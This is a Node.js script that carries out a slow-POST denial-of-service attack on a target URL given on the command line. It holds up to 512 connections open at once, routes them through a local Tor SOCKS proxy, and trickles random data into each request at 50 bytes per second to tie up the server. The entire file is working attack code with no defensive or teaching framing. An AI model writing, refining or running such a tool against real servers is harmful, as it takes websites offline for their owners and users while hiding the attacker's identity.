#!/usr/local/bin/node

var fs = require('fs'),
	url = require('url'),
	spawn = require('child_process').spawn,
	exec = require('child_process').exec,

	shttp = require('socks5-http-client'),
	Throttle = require('stream-throttle').Throttle,

	RandomStream = require('randstream'),
	request,

	requestCount = 0,
	requestMax = Math.pow(2, 9);

if(!!process.argv[2]) {
	request = url.parse(process.argv[2]);
} else {
	console.error('Usage: index.js [target] [socks address]');
	process.exit(1);
}


/****************************************************************
 * FUNCTIONS
 ****************************************************************/

function start() {
	exec('ulimit', ['-n', requestMax], function(err, stdout, stderr) {
		console.log(err, stdout, stderr);

		console.log('\r\nStarting ' + requestMax + ' requests');
		console.log('================================');

		var i = Math.floor(requestMax);
		while(i--) run();

		setInterval(run, 10);
	});
};

function close() {
	requestCount--;
};

function run() {
	if(requestCount >= requestMax) return;
	requestCount++;

	var now = new Date();
	console.log(now, 'Opening new connection');

	var req = shttp.request(request);
	var stream = new RandomStream({
		mode: 'random',
		defaultSize: 8 * 1024 * 1024
	});

	stream.setEncoding('utf8');

	function end_request() {
		if(!req) return;
		req.end();

		close();

		req = null;
	};

	req.on('error', function(e) { console.log(e); end_request(); });
	req.on('close', end_request);

	stream.on('error', function(e) { console.log(e); end_request(); });
	stream.on('close', function(e) { console.log(e); end_request(); });
	stream.pipe(new Throttle({ rate: 50 })).pipe(req);
};


/****************************************************************
 * INITIALISATION
 ****************************************************************/

request.socksHost = '127.0.0.1';
request.socksPort = 9150;
request.method = 'POST';

start();
